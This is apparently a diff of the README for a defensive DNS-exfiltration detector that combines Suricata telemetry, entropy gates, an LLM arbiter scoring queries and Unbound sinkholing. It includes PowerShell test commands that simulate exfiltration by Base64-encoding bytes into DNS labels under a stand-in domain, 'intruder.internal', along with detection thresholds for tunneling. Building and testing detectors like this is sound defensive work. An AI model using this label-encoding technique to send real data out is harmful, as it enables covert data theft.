@@ -14,14 +14,14 @@ This directory contains end-to-end evidence validating the deployment, signal he
 * **Local Control Interface:** UNIX Domain Socket (`/var/run/unbound.ctl`) / CLI (`unbound-control`)
 * **Arbitration Model:** `inception/mercury-decide:free` via OpenRouter Decision API
 * **Decision Threshold:** P(Exfil) >= 0.75
-* **Containment Target:** `127.0.0.1` (`local_zone redirect`)
+* **Containment Target:** `127.0.0.1` in Module 08 captures (`local_zone redirect`; standardized on `0.0.0.0` in Section 3 & Module 09)
 
 ## 2. Evidence Chain of Custody
 
 | Step | Source System | Evidence File / Artifact | Key Findings |
 |---|---|---|---|
 | **01. Volatile RAM Disk Mount** | FreeBSD / OPNsense | [mount-ramdisk-status](./mount-ramdisk-status.txt) | Executed `mount -t tmpfs`; confirmed 64MB volatile storage mounted at `/tmp/ramdisk` with zero persistent flash writes. |
-| **02. Suricata Telemetry Tap** | Suricata Engine | [suricata-eve-dns-sample](./suricata-eve-dns-sample.json) | Captured raw Suricata v3 EVE DNS queries; confirmed request-only logging to `/tmp/ramdisk/eve-dns.json` without response overhead. |
+| **02. Suricata Telemetry Tap** | Suricata Engine | [suricata-eve-dns-sample](./suricata-eve-dns-sample.json) | Captured raw Suricata v3 EVE DNS telemetry to `/tmp/ramdisk/eve-dns.json` (e.g., `type: response` with query/answer metadata). |
 | **03. Benign Query Filtering** | Python Sieve | [sieve-benign-traffic](./sieve-benign-traffic.txt) | Evaluated normal queries (`_dmarc`, compound hostnames with >= 2 hyphens); confirmed immediate bypass without Arbiter queuing. |
 | **04. Standard A/AAAA Flagging** | Python Sieve | [sieve-anomaly-standard](./sieve-anomaly-standard.txt) | Caught 27-char payload `Q09ORklERU5USUFMX1BBWVJPTEw` at H = 4.357; satisfied standard gates (Len >= 20, H >= 4.15). |
 | **05. TXT Tunneling Flagging** | Python Sieve | [sieve-anomaly-txt](./sieve-anomaly-txt.txt) | Caught 32-char payload at H = 4.289 on `TXT` record; satisfied relaxed tunneling gates (Len >= 16, H >= 3.80). |
@@ -59,7 +59,7 @@ When the Arbiter executes dynamic containment via `unbound-control local_zone <a
 
 ### Multi-Process Pipeline Topology
 The pipeline runs two decoupled worker processes communicating over an in-memory queue (`multiprocessing.Queue`) to maintain wire-speed processing:
-* **The Sieve (Process 1):** Attaches to the active EVE JSON stream in `/tmp/ramdisk/eve-dns.json`. Calculates Shannon entropy $H(X)$, evaluates label length, strips RFC metadata prefixes (`_dmarc`, `_domainkey`), drops hyphenated cloud infrastructure hostnames, and runs an LRU debounce cache to suppress burst queries.
+* **The Sieve (Process 1):** Attaches to the active EVE JSON stream in `/tmp/ramdisk/eve-dns.json`. Calculates Shannon entropy $H(X)$, evaluates label length, strips RFC metadata prefixes (`_dmarc`, `_domainkey`), drops hyphenated cloud infrastructure hostnames, and runs a TTL debounce cache to suppress burst queries.
 * **The Arbiter (Process 2):** Consumes flagged candidate frames. Compiles query telemetry, sends structured decision payloads to OpenRouter (`inception/mercury-decide:free`), parses single-value confidence probabilities **P(Exfil) >= 0.75**, and executes dynamic sinkholing commands via `unbound-control`.
 
 ### Telemetry Source Rationale: Suricata EVE vs. Unbound dnstap
@@ -84,9 +84,9 @@ Because attacker tradecraft differs between high-volume IP address lookups and d
 H \(= -\sum P(x) \log_2\) P(x)
 ```
 ### Semantic Arbitration (LLM vs. Static Entropy)
-Static threshold gates flag all high-entropy strings uniformly, causing false positives on base64 test strings. The LLM evaluates semantic byte structure:
-* **Plaintext ASCII in Base64 (`VGhpcyBpcy...`):** $H = 4.289$, length 32. Model decodes "This is a test exfil txt", recognizes human test grammar, and outputs $P = 0.4073$ (below 0.75 threshold; bypasses sinkhole).
-* **Encrypted Binary Payload:** $H = 4.562$, length 32. Model identifies unstructured, pseudorandom byte streams targeting an unauthorized apex and outputs $P = 0.9890$ (containment applied).
+Static threshold gates flag all high-entropy strings uniformly (including benign Base64-encoded metadata or test strings), whereas the LLM evaluates semantic byte structure alongside domain context:
+* **Benign / Test String (`VGhpcyBpcy...`):** $H = 4.289$, length 32. Passes the Sieve TXT gate (`sieve-anomaly-txt.txt`). When evaluated by the LLM, it decodes to `"This is a test exfil txt"` and scores lower ($P = 0.4073$, below the `0.75` auto-sinkhole threshold) because it resembles a human-readable test string rather than ciphertext—highlighting why prompt tuning matters if cleartext Base64 exfiltration also needs to be blocked.
+* **Pseudorandom / Encrypted Payload (`GirQUXElwO...`):** $H = 4.750$, length 32. Model identifies unstructured, high-entropy bytes targeting an unauthorized apex (`intruder.internal`) and outputs $P = 0.9890$ (containment applied).
 
 ### Dynamic Containment Sequence
 When the model returns **P(Exfil) >= 0.75**, the Arbiter injects containment rules directly into Unbound's running in-memory tree:
@@ -94,7 +94,7 @@ When the model returns **P(Exfil) >= 0.75**, the Arbiter injects containment rul
 # 1. Create a wildcard redirection zone for the target apex
 unbound-control -c /var/unbound/unbound.conf local_zone intruder.internal redirect
 
-# 2. Sinkhole all lookups (*.intruder.internal) to localhost
+# 2. Sinkhole all lookups (*.intruder.internal) (127.0.0.1 in prototype; 0.0.0.0 in production)
 unbound-control -c /var/unbound/unbound.conf local_data "intruder.internal A 127.0.0.1"
 
 ```
@@ -138,7 +138,7 @@ Resolve-DnsName -Name "_dmarc.intruder.internal" -Type TXT
 # Plaintext ASCII Base64 (Semantic pass - No sinkhole):
 Resolve-DnsName -Name "VGhpcyBpcyBhIHRlc3QgZXhmaWwgdHh0.intruder.internal" -Type TXT
 
-# Raw Binary Ciphertext (Malicious - Triggers 127.0.0.1 sinkhole):
+# Raw Binary Ciphertext (Malicious - Triggers sinkhole: 127.0.0.1 in prototype / 0.0.0.0 in prod):
 $bytes = [byte[]](1..24 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
 $b64 = [Convert]::ToBase64String($bytes).Replace('+', 'A').Replace('/', 'B').Replace('=', '')
 Resolve-DnsName -Name "$b64.intruder.internal" -Type TXT
@@ -187,12 +187,8 @@ service dns_pipeline start
 Dynamic local zones applied via `unbound-control` exist strictly in memory. If Unbound or OPNsense restarts:
 
 1. Dynamic redirects are cleared from Unbound's zone table.
-
-
-2. On pipeline initialization, the Arbiter executes `unbound-control list_local_zones` to repopulate existing quarantined zones into memory.
-
-
-3. Any subsequent exfiltration query from a persistent client is immediately caught and re-sinkholed by the Sieve.
+2. If only `dns_pipeline` restarts while Unbound remains running, the Arbiter executes `unbound-control list_local_zones` on initialization to reconcile existing quarantined zones.
+3. If Unbound itself restarted, any subsequent exfiltration query from a persistent client is immediately caught and re-sinkholed by the Sieve.
 
 
 
